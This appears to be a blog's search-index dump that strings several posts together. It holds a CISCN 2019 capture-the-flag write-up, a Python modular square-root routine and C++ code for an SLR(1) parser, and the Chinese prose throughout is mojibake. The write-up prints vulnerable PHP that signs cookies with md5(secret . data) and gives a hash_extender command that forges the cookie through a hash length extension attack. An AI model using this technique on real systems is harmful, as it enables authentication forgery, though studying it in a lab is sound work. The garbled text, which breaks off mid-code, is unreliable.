åˆ¤æ–­ï¼Œé¦–å…ˆæ˜¯è¦ encrypt è¿‡åçš„ user å‚æ•°å¼ºç­‰äº Cookie ä¸­ verify çš„å€¼ï¼Œåè€…æ˜¯æˆ‘ä»¬å·²çŸ¥çš„ï¼ˆé€šè¿‡æŠ“åŒ…è·å–ï¼Œè¿˜å¯ä»¥çŸ¥é“ len æ˜¯ 32ï¼‰ã€‚æ¥ç€è¦æ±‚ user å‚æ•°ä¸­åŒ…å« root è¿™ä¸ªå­—ç¬¦ä¸²ã€‚ é€šè¿‡ä¸‹æ–¹ setcookie(\"verify\",encrypt(\"guest\"),time()+60*60*24); è¿™ä¸€è¡Œæˆ‘ä»¬çŸ¥é“ï¼Œverify çš„å€¼æ˜¯ guest ç»è¿‡ encrypt åå¾—åˆ°çš„ï¼Œè€Œ encrypt ä¸­çš„å…¨å±€å˜é‡ key æ˜¯æˆ‘ä»¬æ— æ³•å¾—çŸ¥çš„ï¼Œå› æ­¤æ— æ³•å¼ºè¡Œè®¡ç®— encrypt è¿™ä¸ªå‡½æ•°çš„ç»“æœã€‚æ¢è€Œè¨€ä¹‹ï¼Œä¸€ä¸ª 32 ä½çš„ key è¿æ¥ä¸Š user çš„ md5 å€¼å·²çŸ¥ï¼Œè€Œæˆ‘ä»¬æƒ³æ„é€ å‡ºåœ¨ key è¿æ¥ user å†è¿æ¥ root åçš„æ–° md5 å€¼ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°å“ˆå¸Œæ‰©å±•æ”»å‡»ï¼Œæ„é€  payloadï¼š $ ./hash_extender --data admin123 --secret 10 --append admin123 --signature e7187cb49ce6d5958d279284af968254 --format md5 å¾—åˆ°ï¼š å›¾ 15 \" å›¾ 15 æœ€åï¼Œç”¨ URL è§£ç åçš„ New string ä½œä¸º user å‚æ•°çš„å€¼ï¼Œç”¨ New signature æ›¿æ¢ verify çš„å€¼ï¼Œå³å¯å¾—åˆ° flagï¼š å›¾ 16 \" å›¾ 16 ","date":"2019-06-28","objectID":"/ciscn2019/:2:1","tags":["RSA","ååºåˆ—åŒ–","Hash"],"title":"CISCN2019 åˆèµ›+åŠå†³èµ›éƒ¨åˆ†é¢˜è§£","uri":"/ciscn2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"web3 é¦–å…ˆè®¿é—® robots.txt å¾—åˆ°ï¼š User-agent: Baiduspider Disallow: /bdhfyusdf Disallow: /index? Disallow: /flaggalf? Disallow: /Are you OK? Disallow: /NEWbi? Disallow: /ndsufbewhjubdvse/niubi/ii4375uhnfsv/admin.php? Disallow: /google Disallow: /PrivatePhotos å…¶ä¸­èƒ½è®¿é—®çš„åªæœ‰ http://172.29.12.111/ndsufbewhjubdvse/niubi/ii4375uhnfsv/admin.phpã€‚è®¿é—®åçœ‹åˆ°ä¸€ä¸ªç™»é™†é¡µé¢ï¼Œburp æŠ“åŒ…å‘ç° Cookie ä¸­å­˜åœ¨ä¸€ä¸ªç‰¹æ®Šçš„å­—æ®µï¼š hash_key=e7187cb49ce6d5958d279284af968254; source=0 è§‚å¯Ÿå‘ç°æ˜¯ 32 ä½ï¼ŒçŒœæƒ³æ˜¯ md5 å€¼ã€‚ä½†æ˜¯åˆ°è¿™é‡Œä¸ºæ­¢å¾ˆéš¾å†è¿›ä¸€æ­¥åˆ†æã€‚äºæ˜¯æˆ‘ä»¬æ‰«æå½“å‰ç›®å½•ï¼Œå‘ç°äº† License.txtï¼š $flag = \"flag{xxxxxx_just_a_sample_xxxxxxx}\"; $bisskey = \"xxxxxxxxx_just_a_sample_xxxxxxx\"; // To remember Easily, 10 chars allowed. $username = $_POST[\"username\"]; $password = $_POST[\"password\"]; header(\"hash_key:\" . $hash_key); if (!empty($_COOKIE[\"MyIdentity\"])) { if (urldecode($username) === \"admin123\" \u0026\u0026 urldecode($password) != \"admin123\") { if ($_COOKIE[\"MyIdentity\"] === md5($bisskey . urldecode($username .$password))) { echo \"Great! You win!\\n\"; echo (\"\u003c!-- Y0ur f!4g 1s here\". $flag . \"--\u003e\"); } else { die (\"I don't konw what you say!\"); } } else { die (\"I don't konw what you say!\"); } } setcookie(\"hash_key\", md5($bisskey . urldecode(\"admin123\".\"admin123\")), time() + (60 * 60 * 24 * 7)); è¿™é‡Œæ¥æ”¶ username å’Œ passwd å‚æ•°ï¼Œå¹¶è¦æ±‚ MyIdentity éç©ºçš„æƒ…å†µä¸‹ username å¼ºç­‰äº admin123 ä¸” passwd ç»è¿‡ URL è§£ç ä¸ç­‰äº admin123ã€‚æœ€åä¸€å±‚ if æ˜¯è¦æ±‚ MyIdentity çš„å€¼ç­‰äºæœªçŸ¥çš„é•¿åº¦ä¸º 10 çš„ bisskey è¿æ¥ä¸Š username å’Œ passwd çš„ md5 å€¼ï¼Œæ˜¾ç„¶è¿™ä¸ªæˆ‘ä»¬ä¹Ÿå¾ˆéš¾è®¡ç®—ï¼Œä½†æ˜¯ç±»ä¼¼ web6ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å“ˆå¸Œæ‰©å±•æ”»å‡»çš„æ–¹æ³•å¾—åˆ° flagï¼š å›¾ 17 \" å›¾ 17 å‰©ä½™çš„ä¸€äº›åšå‡ºæ¥çš„é¢˜ï¼Œæ„Ÿè§‰è®°å½•çš„æ„ä¹‰ä¸å¤§å°±æ²¡æœ‰è®°å½•ä¸‹æ¥ã€‚ ","date":"2019-06-28","objectID":"/ciscn2019/:2:2","tags":["RSA","ååºåˆ—åŒ–","Hash"],"title":"CISCN2019 åˆèµ›+åŠå†³èµ›éƒ¨åˆ†é¢˜è§£","uri":"/ciscn2019/"},{"categories":["å¯†ç å­¦"],"content":"å‚è€ƒäº†é™ˆæ­äº®ã€Šä¿¡æ¯å®‰å…¨æ•°å­¦åŸºç¡€ã€‹ç¬¬äºŒç‰ˆä¸Šçš„ç®—æ³•ã€‚ å›Šæ‹¬äº†å¿«é€Ÿå¹‚è¿ç®—ï¼ˆæ¨¡é‡å¤å¹³æ–¹è®¡ç®—æ³•ï¼‰å’Œæ±‚é€†å…ƒï¼ˆæ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•ï¼‰ä¸¤ä¸ªç»å…¸çš„åˆç­‰æ•°è®ºç®—æ³•ã€‚æ¨¡ p å¹³æ–¹æ ¹ç®—æ³•æ˜¯ç”¨æ¥æ±‚è§£å½¢å¦‚ $x^2 \\equiv a (mod\\ p)$ çš„äºŒæ¬¡åŒä½™å¼ï¼Œå…¶ä¸­ $p$ ä¸ºç´ æ•°ï¼Œä¸” $(\\frac{a}{p}) = 1$ã€‚ def quick_pow(a, b, p): ret = 1 a %= p while b: if b\u00261: ret = (ret * a) % p b \u003e\u003e= 1 a = (a * a) % p return ret def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y) def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception('Modular inverse does not exist') else: return x % m a, p = map(int, input('Please input a, p such that x^2 = a (mod p). Input \\'-1 -1\\'to use default values: ').split()) if a == -1 and p == -1: a, p = 315, 907 if quick_pow(a, (p-1) // 2, p) != 1: print('No valid solution.') exit(1) s, t = p-1, 0 while (s\u00261) == 0: t += 1 s \u003e\u003e= 1 print('p-1 = %d= 2^%d* %d' % (p-1, t, s)) b = quick_pow(3, s, p) print('t = %d, s = %d, b = 3^s (mod p) = %d(mod p)'% (t, s, b)) _a = modinv(a, p) x = quick_pow(a, (s+1) // 2, p) print('x_%d= %d(mod p), inv(a) = %d(mod p)'% (t-1, x, _a)) print() for k in range(1, t): res = 1 if quick_pow(_a * x ** 2, 2 ** (t-k-1), p) == 1 else -1 print('(inv(a) * (x_%d)^2) ^ (2^%d) = %d(mod p)'% (t-k, t-k-1, res)) j = 0 if res == 1 else 1 x = (x * b**(j * 2**(k-1))) % p print('j_%d= %d, x_%d= x_%d* b ^ (j_%d* 2^(%d)) = %d(mod p)'% (k-1, j, t-k-1, t-k, k-1, k-1, x)) print() print('x_0 = %d(mod p), x_0\\'= %d(mod p)'% (x, p-x)) ","date":"2019-05-22","objectID":"/mod-p-sqrt/:0:0","tags":["æ•°å­¦","å¿«é€Ÿå¹‚"],"title":"æ¨¡ p å¹³æ–¹æ ¹ç®—æ³•","uri":"/mod-p-sqrt/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"å¤© å‘ é¢„ è­¦ ","date":"2019-05-15","objectID":"/lr-parser/:0:0","tags":["C/C++","ç¼–è¯‘åŸç†"],"title":"LR è¯­æ³•åˆ†æå™¨","uri":"/lr-parser/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"æ¦‚è¿° è¿™æ¬¡éœ€è¦ç”¨ SLR(1) æ–¹æ³•ä¹Ÿå°±æ˜¯è‡ªåº•å‘ä¸Šçš„æ–¹æ³•å®ç°è¯­æ³•åˆ†æå™¨ï¼Œå¹¶ä¸”éœ€è¦è¯†åˆ«å¹¶æ”¹æ­£ç®€å•çš„è¯­æ³•é”™è¯¯ï¼ˆè¿™é‡Œåªå‡ºç°äº†æ¼åˆ†å·çš„é”™è¯¯ï¼‰ã€‚ä¸¾ä¸ªæ —å­ï¼Œè¾“å…¥ï¼š { while (ID == NUM) { ID = NUM } } éœ€è¦æŒ‰è¿™ä¸ªæ ¼å¼è¾“å‡ºï¼š è¯­æ³•é”™è¯¯ï¼Œç¬¬ 4 è¡Œï¼Œç¼ºå°‘ \";\" program =\u003e compoundstmt =\u003e {stmts} =\u003e {stmt stmts} =\u003e {stmt} =\u003e {whilestmt} =\u003e {while ( boolexpr) stmt } =\u003e {while ( boolexpr) compoundstmt } =\u003e {while ( boolexpr) {stmts} } =\u003e {while ( boolexpr) {stmt stmts} } =\u003e {while ( boolexpr) {stmt} } =\u003e {while ( boolexpr) {assgstmt} } =\u003e {while ( boolexpr) {ID = arithexpr ;} } =\u003e {while ( boolexpr) {ID = multexpr arithexprprime ;} } =\u003e {while ( boolexpr) {ID = multexpr ;} } =\u003e {while ( boolexpr) {ID = simpleexpr multexprprime ;} } =\u003e {while ( boolexpr) {ID = simpleexpr ;} } =\u003e {while ( boolexpr) {ID = NUM ;} } =\u003e {while ( arithexpr boolop arithexpr) {ID = NUM ;} } =\u003e {while ( arithexpr boolop multexpr arithexprprime) {ID = NUM ;} } =\u003e {while ( arithexpr boolop multexpr) {ID = NUM ;} } =\u003e {while ( arithexpr boolop simpleexpr multexprprime) {ID = NUM ;} } =\u003e {while ( arithexpr boolop simpleexpr) {ID = NUM ;} } =\u003e {while ( arithexpr boolop NUM) {ID = NUM ;} } =\u003e {while ( arithexpr == NUM) {ID = NUM ;} } =\u003e {while ( multexpr arithexprprime == NUM) {ID = NUM ;} } =\u003e {while ( multexpr == NUM) {ID = NUM ;} } =\u003e {while ( simpleexpr multexprprime == NUM) {ID = NUM ;} } =\u003e {while ( simpleexpr == NUM) {ID = NUM ;} } =\u003e {while ( ID == NUM) {ID = NUM ;} } CFGã€èµ·å§‹ç¬¦ã€ä¿ç•™å­—ä¸ä¸Šä¸€ç¯‡ LL è¯­æ³•åˆ†æå™¨ ç›¸åŒã€‚ ","date":"2019-05-15","objectID":"/lr-parser/:1:0","tags":["C/C++","ç¼–è¯‘åŸç†"],"title":"LR è¯­æ³•åˆ†æå™¨","uri":"/lr-parser/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"æ€è·¯ä¸ä»£ç  å¾ˆå®¹æ˜“å‘ç°ï¼ŒLL è¯­æ³•åˆ†æå™¨ä¸­çš„ä¸€äº›å·²ç»ç¡®è®¤æ­£ç¡®çš„å‡½æ•°åœ¨è¿™é‡Œå¯ä»¥ä½¿ç”¨ï¼Œä¾‹å¦‚ compute_first å’Œ compute_follow ç­‰ã€‚å› æ­¤è¿™æ¬¡æˆ‘ä»¬å°†åŸºäº LL è¯­æ³•åˆ†æçš„ä»£ç è¿›è¡Œä¿®æ”¹ã€‚ ","date":"2019-05-15","objectID":"/lr-parser/:2:0","tags":["C/C++","ç¼–è¯‘åŸç†"],"title":"LR è¯­æ³•åˆ†æå™¨","uri":"/lr-parser/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"å‡†å¤‡å·¥ä½œ å­˜å‚¨ä¸Šä¸éœ€è¦å¤ªå¤šå˜åŒ–ã€‚å¯¹äºè§„åˆ™çš„å­˜å‚¨ï¼Œå› ä¸ºè¿™æ¬¡åœ¨æ¨å¯¼ LR(0) é¡¹ç›®é›†æ—¶ï¼Œè§„åˆ™éœ€è¦æ˜¯æœ‰åºçš„ï¼ˆä¸ºä»€ä¹ˆï¼Ÿï¼‰ï¼Œå› æ­¤ multimap å¯ä»¥æ¢æˆ vector\u003cpair\u003cstring, string\u003e \u003eã€‚ const vector\u003cpair\u003cstring, string\u003e \u003e rules = { {\"program'\",\"program\"}, {\"program\", \"compoundstmt\"}, {\"stmt\", \"ifstmt\"}, {\"stmt\", \"whilestmt\"}, {\"stmt\", \"assgstmt\"}, {\"stmt\", \"compoundstmt\"}, {\"compoundstmt\", \"{ stmts}\"}, {\"stmts\", \"stmt stmts\"}, {\"stmts\", \"E\"}, {\"ifstmt\", \"if ( boolexpr) then stmt else stmt\"}, {\"whilestmt\", \"while ( boolexpr) stmt\"}, {\"assgstmt\", \"ID = arithexpr ;\"}, {\"boolexpr\", \"arithexpr boolop arithexpr\"}, {\"boolop\", \"\u003c\"}, {\"boolop\", \"\u003e\"}, {\"boolop\", \"\u003c=\"}, {\"boolop\", \"\u003e=\"}, {\"boolop\", \"==\"}, {\"arithexpr\", \"multexpr arithexprprime\"}, {\"arithexprprime\", \"+ multexpr arithexprprime\"}, {\"arithexprprime\", \"- multexpr arithexprprime\"}, {\"arithexprprime\", \"E\"}, {\"multexpr\", \"simpleexpr multexprprime\"}, {\"multexprprime\", \"* simpleexpr multexprprime\"}, {\"multexprprime\", \"/ simpleexpr multexprprime\"}, {\"multexprprime\", \"E\"}, {\"simpleexpr\", \"ID\"}, {\"simpleexpr\", \"NUM\"}, {\"simpleexpr\", \"( arithexpr)\"} /*{\"e'\",\"e\"}, {\"e\", \"e + t\"}, {\"e\", \"t\"}, {\"t\", \"t * f\"}, {\"t\", \"f\"}, {\"f\", \"( e)\"}, {\"f\", \"id\"}*/ }; ä¸ LL è¯­æ³•åˆ†æç±»ä¼¼ï¼Œç”±æ˜“åˆ°éš¾æ€»æ˜¯èƒ½å‡è½»ä¸€äº›å·¥ä½œé‡ï¼Œå› æ­¤æœ€åè¢«æ³¨é‡Šæ‰çš„éƒ¨åˆ†æ˜¯æˆ‘ä»¬å¼•å…¥çš„ä¸€ä¸ªæ›´ç®€å•çš„ CFGï¼Œç”¨äºæ–¹ä¾¿åœ°è¿›è¡Œæ­£ç¡®æ€§æµ‹è¯•ã€‚æ³¨æ„è¿™æ¬¡å¤šäº†ä¸€æ¡è§„åˆ™ program'-\u003e programï¼Œè¿™æ˜¯ LR åˆ†æéœ€è¦çš„å¢å¹¿æ–‡æ³•ã€‚ ç»ˆç»“ç¬¦ä¸éç»ˆç»“ç¬¦çš„å­˜å‚¨ä¸å˜ï¼Œé™¤äº†å¢åŠ äº†ä¸€ä¸ªéç»ˆç»“ç¬¦ program'ã€‚ FIRST é›†å’Œ FOLLOW é›†çš„å­˜å‚¨ä¸å˜ã€‚ æœ€åæ˜¯å­˜å‚¨ LR åˆ†æè¡¨ï¼Œåˆ†ä¸º action è¡¨å’Œ goto è¡¨ã€‚goto è¡¨ç”±äºåªæœ‰éœ€è¦ goto çš„çŠ¶æ€çš„æ•°å­—ï¼Œç”¨äºŒç»´ int æ•°ç»„æ˜¯å¾ˆè‡ªç„¶çš„æƒ³æ³•ã€‚è€Œ action è¡¨éœ€è¦å­˜å‚¨ s_n å’Œ r_n è¿™ä¸¤ç§è¡¨é¡¹ï¼ˆn ä¸ºæ•°å­—ï¼‰ï¼Œå¦‚æœç”¨å­—ç¬¦ä¸²å­˜å‚¨é‚£ä¹ˆåœ¨æŸ¥è¯¢è¡¨é¡¹æ—¶è¿˜éœ€è¦è¿›è¡Œä¸€æ¬¡å­—ç¬¦ä¸²å¤„ç†ï¼ˆæ‰¾å‡ºæ˜¯ shift è¿˜æ˜¯ reduceï¼Œä»¥åŠå¯¹åº”çš„æ•°å­—ï¼‰ï¼Œååˆ†éº»çƒ¦ã€‚ ä½†æ˜¯ç”±äºåªæœ‰ shift å’Œ reduce ä¸¤ç§æ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥å…¨éƒ¨é‡‡ç”¨ int å­˜å‚¨ï¼Œç„¶åå€ŸåŠ©æ•°å­—çš„æ­£è´Ÿåˆ¤æ–­è¯¥æ“ä½œæ˜¯ shift è¿˜æ˜¯ reduceã€‚ ","date":"2019-05-15","objectID":"/lr-parser/:2:1","tags":["C/C++","ç¼–è¯‘åŸç†"],"title":"LR è¯­æ³•åˆ†æå™¨","uri":"/lr-parser/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"è®¡ç®— FIRST é›†å’Œ FOLLOW é›† åœ¨ SLR(1) è¯­æ³•åˆ†æä¸­åªéœ€è¦ FOLLOW é›†ï¼Œç„¶è€Œè¦è®¡ç®— FOLLOW é›†æ˜¯éœ€è¦ä¸€éƒ¨åˆ†ç‰¹å®šçš„ FIRST é›†çš„ã€‚å› æ­¤æˆ‘ä»¬è¿˜æ˜¯ä¸¤è€…éƒ½è¦ç®—ã€‚ åŸç†æ²¡æœ‰å˜ï¼Œä»£ç å…¶å®ä¹Ÿæ²¡æœ‰å¤ªå¤§çš„å˜åŒ–ã€‚å”¯ä¸€éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äº LR åˆ†æä¸­å¯èƒ½é‡åˆ°å·¦é€’å½’æ–‡æ³•ï¼ˆä¾‹å¦‚ç”¨æ¥æµ‹è¯•çš„ CFGï¼‰ï¼Œç›¸åº” FIRST é›†çš„è®¡ç®—ä¼šé™·å…¥æ­»å¾ªç¯ã€‚è§£å†³æ–¹æ³•æ˜¯æ‡’è®¡ç®— FIRST é›†ï¼Œå³å¹¶ä¸å¯¹ FIRST é›†è¿›è¡Œé¢„è®¡ç®—ï¼Œè€Œæ˜¯åœ¨è®¡ç®— FOLLOW é›†è¿‡ç¨‹ä¸­éœ€è¦å¯¹åº” FIRST é›†æ—¶æ‰åšè®¡ç®—ï¼Œè¿™æ ·å¯ä»¥æœ‰æ•ˆé¿å¼€æ­»å¾ªç¯çš„é—®é¢˜ã€‚ å› æ­¤ï¼ŒFIRST é›†åœ¨ä¸»å‡½æ•°ä¸­åªåšåŸºæœ¬çš„åˆå§‹åŒ–ï¼š // Init FIRST str_set tmp; for (const auto \u0026expr: t) { tmp.clear(); tmp.insert(expr.first); FIRST.insert(make_pair(expr.first, tmp)); } FOLLOW é›†ä¸­çš„å˜åŒ–ï¼š //first_beta = FIRST[next_str(sspair.second, end+1)]; first_beta = compute_first(next_str(sspair.second, end+1)); æµ‹è¯•å‡½æ•°ä¸å˜ã€‚ ","date":"2019-05-15","objectID":"/lr-parser/:2:2","tags":["C/C++","ç¼–è¯‘åŸç†"],"title":"LR è¯­æ³•åˆ†æå™¨","uri":"/lr-parser/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"é—­åŒ…å‡½æ•° é—­åŒ…æœ‰ä¸¤ç§è®¡ç®—æ–¹æ³•ï¼šå¾ªç¯å’Œé€’å½’ã€‚åœ¨è¢«çœ‹ä¼¼ä¼˜é›…çš„é€’å½’å‘è¿‡åï¼Œæˆ‘çŸ¥é“ä¸ºä»€ä¹ˆæ¨èçš„æ–¹æ³•æ˜¯å¾ªç¯äº†ã€‚ å¯èƒ½æ˜¯è¢« FIRST é›†å’Œ FOLLOW é›†çš„é€’å½’ç®—æ³•å‘å¾—è¿˜ä¸å¤Ÿæƒ¨ã€‚ æˆ‘ä»¬çŸ¥é“ï¼ŒçŠ¶æ€ I çš„é—­åŒ…é¦–å…ˆåŒ…æ‹¬æœ¬èº«ï¼Œéšåå¯¹äº I ä¸­ä»»æ„çš„è§„åˆ™ A -\u003e aa.Bbbï¼ŒB æ˜¯éç»ˆç»“ç¬¦ä¸” B -\u003e y1 | y2 | ... | ynï¼Œæœ‰ B -\u003e .y1 | .y2 | .... | .yn ä¹Ÿå±äº I çš„é—­åŒ…ã€‚é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼ŒA èƒ½å¦ç­‰äº Bï¼Ÿ æœ€åˆï¼Œæˆ‘ä»¥ä¸ºæ˜¯ä¸å¯ä»¥çš„ï¼Œå› ä¸ºæˆ‘å¿½ç•¥äº† aa çš„å­˜åœ¨ï¼Œè®¤ä¸ºè¿™ç§è§„åˆ™å­˜åœ¨å·¦é€’å½’ï¼Œå› æ­¤åº”è¯¥ç«‹å³åœæ­¢é€’å½’è¿ç®—ã€‚ç„¶è€Œï¼Œaa çš„å­˜åœ¨å…è®¸äº† A = B çš„æˆç«‹ï¼Œæ­¤æ—¶ç»§ç»­é€’å½’å¹¶ä¸ä¼šæ— é™å¾ªç¯ã€‚ æ’æ‰è¿™ä¸ªé›·åï¼Œä»£ç æ²¡ä»€ä¹ˆéš¾çš„äº†ï¼š /* Compute the closure of a state recursively */ State closure(State I) { State ret = I; State tmp; string non_terminal; for (const Rule \u0026rule: I) { // A -\u003e xx.Bxx exists in I, and \". is at head while A = B\" is not true in case of right recursive CFG if (nt.count(non_terminal = next_str(rule.rhs, rule.point_pos)) \u0026\u0026 !(non_terminal == rule.lhs \u0026\u0026 rule.point_pos == 0)) { tmp.clear(); for (const auto \u0026sspair: rules) { if (sspair.first == non_terminal) {// put in B -\u003e y1, B -\u003e y2, ... tmp.emplace_back(sspair.first, sspair.second); } } tmp = closure(tmp); ret.insert(ret.end(), tmp.begin(), tmp.end()); } } return ret; } è¿™é‡Œå°±éœ€è¦ç”¨åˆ°ç‰¹åœ°ä¸º LR åˆ†æå†™çš„ Rule å¯¹è±¡ï¼š class Rule { public: string::size_type point_pos; // position of the point string lhs, rhs; Rule() {} Rule(string _lhs, string _rhs, string::size_type _point_pos=0):lhs(_lhs), rhs(_rhs), point_pos(_point_pos) {} bool operator == (const Rule \u0026r) const { return (lhs == r.lhs \u0026\u0026 rhs == r.rhs \u0026\u0026 point_pos == r.point_pos); } }; typedef vector\u003cRule\u003e State; // I_0, I_1, ... vector\u003cState\u003e graph; // DFA graph é—­åŒ…å‡½æ•°çš„æµ‹è¯•æ¯”è¾ƒéº»çƒ¦ï¼Œæœ€å¥½å¤šæµ‹å‡ ä¸ªçŠ¶æ€ï¼Œè¿™æ ·æ‰èƒ½å‘ç°æ½œåœ¨çš„é—®é¢˜ã€‚æ³¨æ„ï¼šé—­åŒ…å‡½æ•°å¦‚æœå­˜åœ¨é—®é¢˜ï¼Œå¾ˆæœ‰å¯èƒ½å¯¼è‡´åé¢åˆ†æè¡¨æ­£ç¡®çš„æƒ…å†µä¸‹ä¾ç„¶å¾—åˆ°é”™è¯¯çš„ç»“æœæˆ–é™·å…¥æ­»å¾ªç¯ã€‚ ","date":"2019-05-15","objectID":"/lr-parser/:2:3","tags":["C/C++","ç¼–è¯‘åŸç†"],"title":"LR è¯­æ³•åˆ†æå™¨","uri":"/lr-parser/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"æ„é€  DFA ä¸åˆ†æè¡¨ è¿™ä¸€æ­¥éœ€è¦ä¸€è¾¹æ„é€  DFAï¼Œä¸€è¾¹å¡« action å’Œ goto è¡¨ã€‚æ‰‹åŠ¨ç”»ä¸‹å›¾ï¼Œå¯ä»¥å‘ç°è¿™é‡Œæ„é€  DFA çš„ç®—æ³•æ— éæ˜¯ä¸€ä¸ª BFSã€‚ ä½†æ˜¯å’Œ BFS ä¸åŒï¼Œè¿™é‡Œä¸éœ€è¦ç”¨é˜Ÿåˆ—å®ç°ï¼Œå› ä¸ºéœ€è¦å­˜å¥½å·²ç»è®¡ç®—å‡ºçš„çŠ¶æ€ï¼ˆè€Œä¸æ˜¯èˆå¼ƒï¼‰ï¼Œåœ¨åé¢çŠ¶æ€çš„è®¡ç®—ä¸­ä¸ä¹‹æ¯”å¯¹ï¼Œé˜²æ­¢é‡å¤çŠ¶æ€å¸¦æ¥çš„å†—ä½™ã€‚æ‰€ä»¥æ•°ç»„å­˜ä¸‹æ¥å°±å¥½ã€‚ ä»èµ·å§‹ç¬¦å¼€å§‹é€çŠ¶æ€è®¡ç®—ï¼Œå¯¹äºå·²è®¡ç®—çš„çŠ¶æ€ï¼ˆå¾€å¾€åªæœ‰ 1-2 ä¸ªè§„åˆ™ï¼‰ï¼Œåªæœ‰æ±‚è¿‡ä¸€æ¬¡é—­åŒ…åæ‰èƒ½è¯´è¿™ä¸ªçŠ¶æ€æ˜¯å®Œæ•´çš„ï¼ˆå¯èƒ½æ‹“å±•åˆ°è¿‘ 10 æ¡è§„åˆ™ï¼‰ã€‚ä½†æœ‰è¶£çš„æ˜¯ï¼Œåªè¦åˆ¤æ–­ä¸¤ä¸ªçŠ¶æ€çš„ç¬¬ä¸€æ¡è§„åˆ™æ˜¯å¦å®Œå…¨ç›¸åŒï¼ˆåŒ…æ‹¬ç‚¹çš„ä½ç½®ï¼‰ï¼Œå°±å¯ä»¥åˆ¤æ–­ä¸¤ä¸ªçŠ¶æ€æ˜¯å¦æ˜¯é‡å¤çš„ï¼ˆä¸ºä»€ä¹ˆï¼Ÿï¼‰ã€‚è¿™æ ·å°±èˆ’æœäº†å¾ˆå¤šã€‚ å‰©ä½™çš„å†…å®¹å°±æ˜¯å¥—è·¯äº†ã€‚åœ¨ä¸‹é¢çš„ä»£ç ä¸­ç”¨åˆ°äº† goto è¿™ä¸ªé¥±å—è¯Ÿç—…çš„å…³é”®å­—ï¼ˆä¸æ˜¯ goto è¡¨ï¼ï¼‰ï¼Œç„¶è€Œåœ¨è·³å‡ºå¤šå±‚å¾ªç¯æ—¶ï¼Œå¿…é¡»æ‰¿è®¤ä½¿ç”¨ goto ç»å¯¹æ˜¯åˆ©å¤§äºå¼Šçš„ã€‚ /* Construct the DFA graph of States */ void build_graph() { State I0; I0.emplace_back(start_symbol +\"'\", start_symbol); graph.push_back(I0); string pointed; // the symbol being pointed at State new_state; for (int cur = 0; cur != graph.size(); ++cur) { // every State in graph graph[cur] = closure(graph[cur]); // now we can say graph[cur] is complete for (int i = 0; i \u003c graph[cur].size(); ++i) {// every Rule in graph[cur] Rule \u0026rule = graph[cur][i]; pointed = next_str(rule.rhs, rule.point_pos); if (pointed ==\"E\") { // . is at the tail, reduce if (rule.lhs == start_symbol +\"'\") { action[cur][t[\"$\"]] = acc; } else { for (const string \u0026expr: FOLLOW[rule.lhs]) { // SLR: consider every terminal in FOLLOW action[cur][t[expr]] = -1 * distance(rules.begin(), find(rules.begin(), rules.end(), make_pair(rule.lhs, rule.rhs))); } } continue; } int \u0026target = nt.count(pointed) ? go_to[cur][nt[pointed]] : action[cur][t[pointed]]; // the target blank we're filling if (target == 0) { // the blank is not already filled target = graph.size(); for (int j = 1; j \u003c graph.size(); ++j) { if (graph[j][0] == Rule(rule.lhs, rule.rhs, rule.point_pos + pointed.size() + 1)) { target = j; // replace the target by the real State goto dup; } } graph.emplace_back(new_state); // create the new empty state } graph[target].emplace_back(rule.lhs, rule.rhs, rule.point_pos + pointed.size() + 1); dup: ; } } } ","date":"2019-05-15","objectID":"/lr-parser/:2:4","tags":["C/C++","ç¼–è¯‘åŸç†"],"title":"LR è¯­æ³•åˆ†æå™¨","uri":"/lr-parser/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"è¿›è¡Œè¯­æ³•åˆ†æ è¿™æ¬¡çš„è¾“å‡ºï¼Œå’Œ LL è¯­æ³•åˆ†æä¸åŒï¼Œå¯¹å¾ªç¯ç»“æ„æ›´å‹å¥½ã€‚æœæ–­ç”¨ stack å®ç°ã€‚ éœ€è¦æ³¨æ„çš„å°±æ˜¯è¡Œæ•°ç»Ÿè®¡ä¸è¦é‡å¤ç»Ÿè®¡ï¼Œæˆ‘è¿™é‡Œæ”¾åœ¨äº† shift æƒ…å†µé‡Œã€‚è‡³äº reduce ä¸­è¦æ³¨æ„çš„å°±æ˜¯ E è¿™ä¸ªä»£è¡¨ Îµ çš„å­—ç¬¦ï¼Œåœ¨è€ƒè™‘è§„åˆ™å³è¾¹çš„ç¬¦å·ä¸ªæ•°æ—¶ï¼Œå®ƒæ˜¯ä¸èƒ½è¢«ç®—ä½œä¸€ä¸ªç¬¦å·çš„ï¼Œè¿™ä¸€åº¦è®©æˆ‘å¯¹ç€æ­»å¾ªç¯è¿·æƒ‘äº†å¾ˆä¹…ã€‚ å…¶ä½™çš„ä¾æ—§æ˜¯å¥—è·¯ï¼Œæœ€ååœ¨é‡åˆ°ä¸º 0 çš„è¡¨é¡¹æ—¶è¯´æ˜å‘ç”Ÿäº†è¯­æ³•é”™è¯¯ï¼Œè¿™é‡Œé”™è¯¯å¤„ç†å·äº†ä¸ªæ‡’ã€‚ void parse() { stack\u003cstring\u003e s; s.push(\"0\"); int num, len, tmp; string input_top; string::size_type start; out.clear(); while (!(s.top() == \"1\" \u0026\u0026 input == \"$\")) { input_top = next_str(input, 0); if ((num = action[stoi(s.top())][t[input_top]]) \u003e 0) { // shift start = input.find_first_not_of(\" \\n\\t\", input_top.size()); if (input.substr(0, start).find('\\n') != string::npos) { // when we're bypassing a \\n ++line; } s.push(input_top); s.push(to_string(num)); input = input.substr(start); // get rid of input_top } else if (num \u003c 0) { // reduce num = -num; out.push_back(num); len = count(rules[num].second.begin(), rules[num].second.end(),' ') + 1; // num of symbols if (rules[num].second == \"E\") { // but!!! E is special len = 0; } for (int i = 0; i \u003c (len\u003c\u003c1); ++i) { s.pop(); } tmp = 